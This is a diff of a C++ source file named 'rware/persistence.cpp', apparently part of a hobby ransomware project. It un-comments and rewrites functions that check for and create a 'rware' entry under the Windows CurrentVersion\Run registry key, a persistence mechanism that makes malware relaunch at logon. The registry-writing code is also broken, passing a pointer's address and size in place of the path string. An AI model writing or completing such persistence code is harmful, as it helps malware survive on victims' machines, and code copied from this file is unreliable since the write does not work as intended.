+++ rware/persistence.cpp
@@ -1,16 +1,11 @@
-#include <windows.h>
-#include "strsafe.h"
-#include <ShlObj.h>
-#include <iostream>
+#include "persistence.h"
 
-//finish this one day lmao
-
-/*int checkForRegkey() {
+int checkForRegkey() {
 
 	HKEY cléRegistre;
 	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &cléRegistre) == ERROR_SUCCESS) {
 
-		if (RegGetValueW(cléRegistre, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", L"rware", 2, NULL, NULL, NULL) == ERROR_SUCCESS) {
+		if (RegGetValueW(cléRegistre, 0, L"rware", 2, NULL, NULL, NULL) == ERROR_SUCCESS) {
 
 			std::cout << "The key does indeed exist";
 			return 0;
@@ -33,32 +28,26 @@
 		RegCloseKey(cléRegistre);
 		return -1;
 	};
-}*/
+
+	return 0;
+}
+
+int setRegkey() {
 
 
-/*int setRegkey() {
+	LPCWSTR path = L"C:\\Windows\\Temp\\truc.txt";
+	if (RegSetKeyValueW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", L"rware", REG_SZ, LPBYTE(&path), sizeof(path)) == ERROR_SUCCESS) {
 
-	HKEY cléRegistre;
-	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_READ, &cléRegistre) == ERROR_SUCCESS) {
-		LPWSTR path;
-		GetModuleFileNameW(nullptr, path, MAX_PATH);
-		DWORD pathlen = sizeof(path);
-
-		//RegSetValueExW(cléRegistre,L"rware",NULL,REG_SZ,path,pathlen);
-
-
+		std::cout << "Key created" << std::endl;
+		return 0;
 	}
 	else {
 		DWORD d;
 		d = GetLastError();
-		std::cout << "Failure to open handle to the regkey, error code 0x" << d << std::endl;
-		RegCloseKey(cléRegistre);
+		std::cout << "Failure to create the regkey, error code 0x" << d << std::endl;
+
 		return -1;
 
 	}
-
-
-
-
 	return 0;
-}*/
+}
